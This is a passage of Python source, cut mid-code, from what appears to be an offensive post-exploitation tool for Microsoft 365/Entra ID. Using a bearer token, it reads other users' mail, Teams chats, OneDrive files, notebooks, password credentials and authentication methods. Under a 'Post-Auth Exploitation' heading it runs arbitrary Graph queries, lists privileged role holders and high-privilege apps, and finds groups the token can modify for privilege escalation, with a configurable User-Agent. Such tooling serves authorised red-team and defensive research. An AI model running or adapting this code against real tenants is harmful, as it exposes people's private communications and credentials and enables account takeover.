                        for resource in value:
                            print_green(f"  Resource App ID: {resource['resourceAppId']}")
                            for access in resource['resourceAccess']:
                                role_id = access['id']
                                role_type = access['type']
                                if role_id in permissions:
                                    perm_type, role_name, description, consent_required = permissions[role_id]
                                    print_green(f"    Role ID: {role_id}")
                                    print_green(f"    Role Name: {role_name}")
                                    print_green(f"    Description: {description}")
                                    print_green(f"    Type: {role_type}")
                                    print_green(f"    Permission Type: {perm_type}")
                                    print_green(f"    Admin Consent Required: {consent_required}")
                                else:
                                    print_red(f"    Role ID: {role_id} (Information not found)")
                                    print_red(f"    Type: {role_type}")
                                print("    ---")
                    else:
                        print_red(f"{key} : No assignments")
                elif key != "@odata.context":
                    print(f"{key}: {value}")
        else:
            print_red(f"[-] Failed to retrieve Azure Application details: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-appserviceprincipal
    elif args.command and args.command.lower() == "get-appserviceprincipal":
        if not args.id:
            print_red("[-] Error: --id <app id> argument is required for Get-AppServicePrincipal command")
            return
            
        print_yellow("\n[*] Get-AppServicePrincipal")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId+eq+'{args.id}'"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        graph_api_get(access_token, api_url, args)
        print("=" * 80)
    
    # get-serviceprincipal
    elif args.command and args.command.lower() == "get-serviceprincipal":
        if not args.id:
            print_red("[-] Error: --id <id> argument is required for Get-ServicePrincipal command")
            return
            
        print_yellow("\n[*] Get-ServicePrincipal")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/servicePrincipals/{args.id}"
        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()
            for key, value in response_json.items():
                if key != "@odata.context":
                    print(f"{key}: {value}")

        else:
            print_red(f"[-] Failed to retrieve Service Principal details: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-serviceprincipalapproleassignments
    elif args.command and args.command.lower() == "get-serviceprincipalapproleassignments":
        print_yellow("\n[*] Get-ServicePrincipalAppRoleAssignments")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/servicePrincipals/{args.id}/appRoleAssignments"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-personalcontacts
    elif args.command and args.command.lower() == "get-personalcontacts":
        print_yellow("\n[*] Get-PersonalContacts")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/contacts"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-crosstenantaccesspolicy
    elif args.command and args.command.lower() == "get-crosstenantaccesspolicy":
        print_yellow("\n[*] Get-CrossTenantAccessPolicy")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy"
        if args.id:
            api_url += f"/{args.id}"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-partnercrosstenantaccesspolicy
    elif args.command and args.command.lower() == "get-partnercrosstenantaccesspolicy":
        print_yellow("\n[*] Get-PartnerCrossTenantAccessPolicy")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/templates/multiTenantOrganizationPartnerConfiguration"
        if args.id:
            api_url += f"/{args.id}"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-userchatmessages
    elif args.command and args.command.lower() == "get-userchatmessages":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-UserChatMessages command")
            return

        print_yellow("\n[*] Get-UserChatMessages")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/chats"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-administrativeunitmember
    elif args.command and args.command.lower() == "get-administrativeunitmember":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-AdministrativeUnitMember command")
            return

        print_yellow("\n[*] Get-AdministrativeUnitMember")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/directory/administrativeUnits/{args.id}/members"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-onedrivefiles
    elif args.command and args.command.lower() == "get-onedrivefiles":
        print_yellow("\n[*] Get-OneDriveFiles")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/drive/root/children"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/drive/root/children"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-userpermissiongrants
    elif args.command and args.command.lower() == "get-userpermissiongrants":
        print_yellow("\n[*] Get-UserPermissionGrants")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/permissionGrants"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/permissionGrants"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-oauth2permissiongrants
    elif args.command and args.command.lower() == "get-oauth2permissiongrants":
        print_yellow("\n[*] Get-oauth2PermissionGrants")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/oauth2PermissionGrants"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-messages
    elif args.command and args.command.lower() == "get-messages":
        print_yellow("\n[*] Get-Messages")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/messages"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/messages"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-temporaryaccesspassword
    elif args.command and args.command.lower() == "get-temporaryaccesspassword":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-TemporaryAccessPassword command")
            return

        print_yellow("\n[*] Get-TemporaryAccessPassword")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/authentication/passwordMethods"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-password
    elif args.command and args.command.lower() == "get-password":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-Password command")
            return

        print_yellow("\n[*] Get-Password")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/passwordCredentials"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-authmethods
    elif args.command and args.command.lower() == "list-authmethods":
        print_yellow("\n[*] List-AuthMethods")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/authentication/methods"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/authentication/methods"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-directoryroles
    elif args.command and args.command.lower() == "list-directoryroles":
        print_yellow("\n[*] List-DirectoryRoles")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/directoryRoles"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-notebooks
    elif args.command and args.command.lower() == "list-notebooks":
        print_yellow("\n[*] List-Notebooks")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/onenote/notebooks"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/onenote/notebooks"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-conditionalaccesspolicies
    elif args.command and args.command.lower() == "list-conditionalaccesspolicies":
        print_yellow("\n[*] List-ConditionalAccessPolicies")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-conditionalauthenticationcontexts
    elif args.command and args.command.lower() == "list-conditionalauthenticationcontexts":
        print_yellow("\n[*] List-ConditionalAuthenticationContexts")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/authenticationContextClassReferences"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-conditionalnamedlocations
    elif args.command and args.command.lower() == "list-conditionalnamedlocations":
        print_yellow("\n[*] List-ConditionalNamedLocations")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-sharepointroot
    elif args.command and args.command.lower() == "list-sharepointroot":
        print_yellow("\n[*] List-SharePointRoot")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/sites/root"
        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()

            for key, value in response_json.items():
                if key != "@odata.context":
                    print(f"{key}: {value}")

        else:
            print_red(f"[-] Failed to retrieve current user: {response.status_code}")
            print_red(response.text)

        print("=" * 80)

    # list-sharepointsites
    elif args.command and args.command.lower() == "list-sharepointsites":
        print_yellow("\n[*] List-SharePointSites")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/sites"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)
    
    # list-sharepointurls
    elif args.command and args.command.lower() == "list-sharepointurls":
        print_yellow("\n[*] List-SharePointURLs")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/search/query"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }
        data = {
            "requests": [
                {
                    "entityTypes": ["drive"],
                    "query": {
                        "queryString": "*"
                    },
                    "from": 0,
                    "size": 500,
                    "fields": [
                        "webUrl"
                    ]
                }
            ]
        }
        
        try:
            response = requests.post(api_url, headers=headers, json=data, timeout=30)
            response.raise_for_status()
            
            response_body = response.json()
            
            if 'value' in response_body:
                for item in response_body['value']:
                    for hit in item.get('hitsContainers', []):
                        for result in hit.get('hits', []):
                            web_url = result.get('resource', {}).get('webUrl')
                            if web_url:
                                print(web_url)
            else:
                print_yellow("[!] No results found in the response.")
            
            next_link = response_body.get("@odata.nextLink")
            while next_link:
                response = requests.get(next_link, headers=headers, timeout=30)
                response.raise_for_status()
                response_body = response.json()
                
                if 'value' in response_body:
                    for item in response_body['value']:
                        for hit in item.get('hitsContainers', []):
                            for result in hit.get('hits', []):
                                web_url = result.get('resource', {}).get('webUrl')
                                if web_url:
                                    print(web_url)
                
                next_link = response_body.get("@odata.nextLink")
        
        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to search data: {str(e)}")
            if hasattr(e, 'response'):
                print_red(e.response.text)
        
        print("=" * 80)

    # list-externalconnections
    elif args.command and args.command.lower() == "list-externalconnections":
        print_yellow("\n[*] List-ExternalConnections")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/external/connections"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-applications
    elif args.command and args.command.lower() == "list-applications":
        print_yellow("\n[*] List-Applications")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/applications"
        if args.select:
            api_url += "?$select=" + args.select
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': 'Bearer ' + access_token,
            'Accept': 'application/json',
            'User-Agent': user_agent
        }
        
        response = requests.get(api_url, headers=headers)
        
        if response.status_code == 200:
            applications = response.json()
        else:
            print_red(f"[-] Error: API request failed with status code {response.status_code}")
            applications = None
        
        def parse_roleids(content):
            soup = BeautifulSoup(content, 'html.parser')
            permissions = {}
            for h3 in soup.find_all('h3'):
                permission_name = h3.get_text()
                table = h3.find_next('table')
                rows = table.find_all('tr')
                application_id = rows[1].find_all('td')[1].get_text()
                delegated_id = rows[1].find_all('td')[2].get_text()
                application_description = rows[2].find_all('td')[1].get_text()
                delegated_description = rows[2].find_all('td')[2].get_text()
                application_consent = rows[4].find_all('td')[1].get_text() if len(rows) > 4 else "Unknown"
                delegated_consent = rows[4].find_all('td')[2].get_text() if len(rows) > 4 else "Unknown"
                permissions[application_id] = ('Application', permission_name, application_description, application_consent)
                permissions[delegated_id] = ('Delegated', permission_name, delegated_description, delegated_consent)
            return permissions
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, '.github', 'graphpermissions.txt')
        try:
            with open(file_path, 'r') as file:
                content = file.read()
        except FileNotFoundError:
            print_red(f"\n[-] The file {file_path} does not exist.")
            sys.exit(1)
        except Exception as e:
            print_red(f"\n[-] An error occurred: {e}")
            sys.exit(1)
        
        permissions = parse_roleids(content)
        
        if applications and 'value' in applications:
            for app in applications['value']:
                for key, value in app.items():
                    if key == 'requiredResourceAccess':
                        if value:
                            print_green(f"{key}:")
                            for resource in value:
                                print_green(f"  Resource App ID: {resource['resourceAppId']}")
                                for access in resource['resourceAccess']:
                                    role_id = access['id']
                                    role_type = access['type']
                                    if role_id in permissions:
                                        perm_type, role_name, description, consent_required = permissions[role_id]
                                        print_green(f"    Role ID: {role_id}")
                                        print_green(f"    Role Name: {role_name}")
                                        print_green(f"    Description: {description}")
                                        print_green(f"    Type: {role_type}")
                                        print_green(f"    Permission Type: {perm_type}")
                                        print_green(f"    Admin Consent Required: {consent_required}")
                                    else:
                                        print_red(f"    Role ID: {role_id} (Information not found)")
                                        print_red(f"    Type: {role_type}")
                                    print("    ---")
                        else:
                            print_red(f"{key} : No assignments")
                    else:
                        print(f"{key} : {value}")
                print("\n")
        print("=" * 80)

    # list-serviceprincipals
    elif args.command and args.command.lower() == "list-serviceprincipals":
        print_yellow("\n[*] List-ServicePrincipals")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/servicePrincipals"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-tenants
    elif args.command and args.command.lower() == "list-tenants":
        print_yellow("\n[*] List-Tenants")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/tenantRelationships/multiTenantOrganization/tenants"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-joinedteams
    elif args.command and args.command.lower() == "list-joinedteams":
        print_yellow("\n[*] List-JoinedTeams")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/joinedTeams"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/joinedTeams"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-chats
    elif args.command and args.command.lower() == "list-chats":
        print_yellow("\n[*] List-Chats")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/chats"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/chats"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-chatmessages
    elif args.command and args.command.lower() == "list-chatmessages":
        if not args.id:
            print_red("[-] Error: --id argument is required for List-ChatMessages command")
            return
        
        print_yellow("\n[*] List-ChatMessages")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/chats/{args.id}/messages"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-devices
    elif args.command and args.command.lower() == "list-devices":
        print_yellow("\n[*] List-Devices")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/devices"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)

    # list-administrativeunits
    elif args.command and args.command.lower() == "list-administrativeunits":
        print_yellow("\n[*] List-AdministrativeUnits")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/directory/administrativeUnits"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-onedrives
    elif args.command and args.command.lower() == "list-onedrives":
        print_yellow("\n[*] List-OneDrives")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/drives"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/drives"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-recentonedrivefiles
    elif args.command and args.command.lower() == "list-recentonedrivefiles":
        print_yellow("\n[*] List-RecentOneDriveFiles")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/drive/recent"
        user_agent = get_user_agent(args)
        headers = {
            "Authorization": f"Bearer {access_token}",
            "User-Agent": user_agent
        }
        try:
            while api_url:
                response = requests.get(api_url, headers=headers)
                response.raise_for_status()
                response_body = response.json()
                filtered_data = response_body.get('value', [])
                if filtered_data:
                    file_count = 1
                    for d in filtered_data:
                        print_green(f"File {file_count}")
                        if args.select:
                            selected_fields = args.select.split(',')
                            for field in selected_fields:
                                value = d
                                for part in field.split('.'):
                                    if isinstance(value, dict) and part in value:
                                        value = value[part]
                                    else:
                                        value = None
                                        break
                                if value is not None:
                                    print(f"{field} : {value}")
                        else:
                            for key, value in d.items():
                                if isinstance(value, (str, int, float, bool)):
                                    print(f"{key} : {value}")
                                elif isinstance(value, dict):
                                    print(f"{key} : {json.dumps(value, indent=2)}")
                                else:
                                    print(f"{key} : {str(value)}")
                        print("\n")
                        file_count += 1
                else:
                    print_red("[-] No data found")
                    return
                
                api_url = response_body.get("@odata.nextLink")
        except requests.RequestException as e:
            print_red(f"[-] Error making request: {str(e)}")
        print("=" * 80)

    # list-sharedonedrivefiles
    elif args.command and args.command.lower() == "list-sharedonedrivefiles":
        print_yellow("\n[*] List-SharedOneDriveFiles")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/drive/sharedWithMe"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # list-onedriveurls
    elif args.command and args.command.lower() == "list-onedriveurls":

        print_yellow("\n[*] List-OneDriveURLs")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/search/query"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        data = {
            "requests": [
                {
                    "entityTypes": ["driveItem"], # get OneDrive and SharePoint - no only OneDrive option
                    "query": {
                        "queryString": "*"
                    },
                    "from": 0,
                    "size": 500,
                    "fields": [
                        "webUrl"
                    ]
                }
            ]
        }
        
        try:
            response = requests.post(api_url, headers=headers, json=data, timeout=30)
            response.raise_for_status()
            
            response_body = response.json()
            
            if 'value' in response_body:
                for item in response_body['value']:
                    for hit in item.get('hitsContainers', []):
                        for result in hit.get('hits', []):
                            web_url = result.get('resource', {}).get('webUrl')
                            if web_url:
                                print(web_url)
            else:
                print_yellow("[!] No results found in the response.")
            
            next_link = response_body.get("@odata.nextLink")
            while next_link:
                response = requests.get(next_link, headers=headers, timeout=30)
                response.raise_for_status()
                response_body = response.json()
                
                if 'value' in response_body:
                    for item in response_body['value']:
                        for hit in item.get('hitsContainers', []):
                            for result in hit.get('hits', []):
                                web_url = result.get('resource', {}).get('webUrl')
                                if web_url:
                                    print(web_url)
                
                next_link = response_body.get("@odata.nextLink")
        
        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to search data: {str(e)}")
            if hasattr(e, 'response'):
                print_red(e.response.text)
        
        print("=" * 80)


    ##########################
    # Post-Auth Exploitation #
    ##########################

    # invoke-customquery
    elif args.command and args.command.lower() == "invoke-customquery":
        if not args.query:
            print_red("[-] Error: --query argument is required for Invoke-CutstomQuery command")
            return

        print_yellow("\n[*] Invoke-CutstomQuery")
        print("=" * 80)
        api_url = args.query
        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()

            if "@odata.context" in response_json:
                del response_json["@odata.context"]

            print(json.dumps(response_json, indent=4))

        else:
            print_red(f"[-] Failed to retrieve query: {response.status_code}")
            print_red(response.text)
        print("=" * 80)
    
    # invoke-search
    elif args.command and args.command.lower() == "invoke-search":
        if not args.search or not args.entity:
            print_red("[-] Error: --search and --entity required for Invoke-Search command")
            return

        print_yellow("\n[*] Invoke-Search")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/search/query"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        json_body = {
                "requests": [
                    {
                        "entityTypes": [args.entity],
                        "query": {
                            "queryString": args.search
                        }
                    }
                ]
            }
        
        response = requests.post(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            response_body = response.json()
                
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    print(f"{key}: {pretty_value}")
                
            url = response_body.get("@odata.nextLink")
            if url:
                response = requests.get(url, headers=headers)
                response.raise_for_status()
                response_body = response.json()
        else:
            print_red(f"[-] Failed to search data: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # find-privilegedroleusers
    elif args.command and args.command.lower() == "find-privilegedroleusers":
        print_yellow("\n[*] Find-PrivilegedRoleUsers")
        print("=" * 80)

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        for role in roles:
            api_url = f"https://graph.microsoft.com/v1.0/directoryRoles(roleTemplateId='{role['roleTemplateId']}')/members"
            response = requests.get(api_url, headers=headers)

            if response.ok:
                print_green(f"[+] Role: {role['displayName']}")
                print(f"Description: {role['description']}")
                response_body = response.json()
                filtered_data = {key: value for key, value in response_body.items() if not key.startswith("@odata")}
                format_list_style(filtered_data)
            else:
                print_red(f"[-] Role: {role['displayName']}")
        print("=" * 80)

    # find-privilegedapplications
    elif args.command and args.command.lower() == "find-privilegedapplications":
        print_yellow("\n[*] Find-PrivilegedApplications")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/applications?$select=appId"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': 'Bearer ' + access_token,
            'Accept': 'application/json',
            'User-Agent': user_agent
        }
        
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            applications = response.json()
            app_ids = [app['appId'] for app in applications.get('value', [])]
        else:
            print_red(f"[-] Error: API request failed with status code {response.status_code}")
            app_ids = []

        service_principals = []
        for app_id in app_ids:
            sp_api_url = f"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '{app_id}'&$select=id,appDisplayName"
            sp_response = requests.get(sp_api_url, headers=headers)
            
            if sp_response.status_code == 200:
                sp_data = sp_response.json()
                for sp in sp_data.get('value', []):
                    service_principals.append({
                        'id': sp['id'],
                        'appDisplayName': sp['appDisplayName']
                    })
            else:
                print_red(f"[-] Error: Service Principal API request failed for appId {app_id} with status code {sp_response.status_code}")

        app_role_assignments = {}
        for sp in service_principals:
            app_role_url = f"https://graph.microsoft.com/v1.0/servicePrincipals/{sp['id']}/appRoleAssignments"
            app_role_response = requests.get(app_role_url, headers=headers)
            
            if app_role_response.status_code == 200:
                assignments = app_role_response.json()
                app_role_assignments[sp['id']] = {
                    'appDisplayName': sp['appDisplayName'],
                    'assignments': assignments.get('value', [])
                }
            else:
                print_red(f"[-] Error: App Role Assignments API request failed for Service Principal ID {sp['id']}: {app_role_response.status_code}")
                print_red(app_role_response.text)

        def parse_roleids(content):
            soup = BeautifulSoup(content, 'html.parser')
            permissions = {}
            for h3 in soup.find_all('h3'):
                permission_name = h3.get_text()
                table = h3.find_next('table')
                rows = table.find_all('tr')
                application_id = rows[1].find_all('td')[1].get_text()
                delegated_id = rows[1].find_all('td')[2].get_text()
                application_description = rows[2].find_all('td')[1].get_text()
                delegated_description = rows[2].find_all('td')[2].get_text()
                application_consent = rows[4].find_all('td')[1].get_text() if len(rows) > 4 else "Unknown"
                delegated_consent = rows[4].find_all('td')[2].get_text() if len(rows) > 4 else "Unknown"
                permissions[application_id] = ('Application', permission_name, application_description, application_consent)
                permissions[delegated_id] = ('Delegated', permission_name, delegated_description, delegated_consent)
            return permissions

        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, '.github', 'graphpermissions.txt')
        try:
            with open(file_path, 'r') as file:
                content = file.read()
        except FileNotFoundError:
            print_red(f"\n[-] The file {file_path} does not exist.")
            sys.exit(1)
        except Exception as e:
            print_red(f"\n[-] An error occurred: {e}")
            sys.exit(1)

        permissions = parse_roleids(content)

        # results
        for sp_id, data in app_role_assignments.items():
            print(f"\nApplication: {data['appDisplayName']}")
            if data['assignments']:
                for assignment in data['assignments']:
                    app_role_id = assignment.get('appRoleId', 'N/A')
                    print_green(f"[+] App Role ID: {app_role_id}")
                    if app_role_id in permissions:
                        role_type, role_name, description, consent_required = permissions[app_role_id]
                        print_green(f"[+] Role Name: {role_name}")
                        print_green(f"[+] Description: {description}")
                        #print_green(f"[+] Role Type: {role_type}") # can only be application for appRoleAssignments, delegated role types use oauth2PermissionGrants
                        #print_green(f"[+] Admin Consent Required: {consent_required}") # admin consent required for all app graph perms
                    else:
                        print_red(f"[-] Role information not found for App Role ID: {app_role_id}")
                    print_green(f"[+] Resource: {assignment.get('resourceDisplayName', 'N/A')}")
                    print("---")
            else:
                print_red("[-] No role assignments")
        print("=" * 80)

    # find-updatablegroups
    elif args.command and args.command.lower() == "find-updatablegroups":
        print_yellow("\n[*] Find-UpdatableGroups")
        print("=" * 80)
        graph_api_endpoint = "https://graph.microsoft.com/v1.0/groups"
        estimate_access_endpoint = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess"
        
        default_fields = ['id','displayName', 'description', 'isAssignableToRole', 'onPremisesSyncEnabled', 'mail', 'createdDateTime', 'visibility']
        
        if args.select:
            select_fields = args.select.split(',')
            graph_api_endpoint += f"?$select=id,{args.select}"
        else:
            select_fields = default_fields
            graph_api_endpoint += f"?$select=id,{','.join(select_fields)}"
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }
        results = []
        while graph_api_endpoint:
            try:
                response = requests.get(graph_api_endpoint, headers=headers)
                response.raise_for_status()
                response_data = response.json()
                for group in response_data['value']:
                    if 'id' not in group:
                        print_yellow(f"[!] Group without 'id' found, skipping")
                        continue
                    group_id = group['id']
                    request_body = {
                        "resourceActionAuthorizationChecks": [
                            {
                                "directoryScopeId": f"/{group_id}",
                                "resourceAction": "microsoft.directory/groups/members/update"
                            }
                        ]
                    }
                    while True:
                        try:
                            estimate_response = requests.post(estimate_access_endpoint, headers=headers, json=request_body)
                            estimate_response.raise_for_status()
                            estimate_data = estimate_response.json()
                            if estimate_data['value'][0]['accessDecision'] == "allowed":
                                group_out = {k: group.get(k) for k in select_fields if k in group}
                                results.append(group_out)
                            break  
                        except requests.exceptions.HTTPError as e:
                            if e.response.status_code == 429:
                                print_yellow("[*] Requests throttled... sleeping for 5 seconds")
                                time.sleep(5)
                            else:
                                print_red(f"[-] Error estimating access for group: {str(e)}")
                                break
                        except requests.exceptions.RequestException as e:
                            print_red(f"[-] Error estimating access for group: {str(e)}")
                            break
                graph_api_endpoint = response_data.get('@odata.nextLink')
            except requests.exceptions.RequestException as e:
                print_red(f"[-] Error fetching Groups: {str(e)}")
                break
        if results:
            max_key_length = max(len(key) for result in results for key in result.keys())
            for result in results:
                for key, value in result.items():
                    print(f"{key:<{max_key_length}} : {value}")
                print("")
        else:
            print_red("[-] No updatable groups found")
        print("=" * 80)

    # find-dynamicgroups
    elif args.command and args.command.lower() == "find-dynamicgroups":
        print_yellow("\n[*] Find-DynamicGroups")
        print("=" * 80)
        graph_api_endpoint = "https://graph.microsoft.com/v1.0/groups"
        estimate_access_endpoint = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }
        results = []

        while graph_api_endpoint:
            try:
                while True:
                    try:
                        response = requests.get(graph_api_endpoint, headers=headers)
                        response.raise_for_status()
                        break
                    except requests.exceptions.HTTPError as e:
                        if e.response.status_code == 429:
                            print_yellow("[*] Requests throttled... sleeping 5 seconds")
                            time.sleep(5)
                        else:
                            raise

                response_data = response.json()
                
                for group in response_data['value']:
                    group_id = f"/{group['id']}"
                    request_body = {
                        "resourceActionAuthorizationChecks": [
                            {
                                "directoryScopeId": group_id,
                                "resourceAction": "microsoft.directory/groups/members/update"
                            }
                        ]
                    }

                    if group.get('membershipRule') is not None:
                        #print_green(f"[+] Found dynamic group: {group['displayName']}")
                        group_out = {
                            "Group Name": group.get('displayName'),
                            "Group ID": group.get('id'),
                            "Description": group.get('description'),
                            "Is Assignable To Role": group.get('isAssignableToRole'),
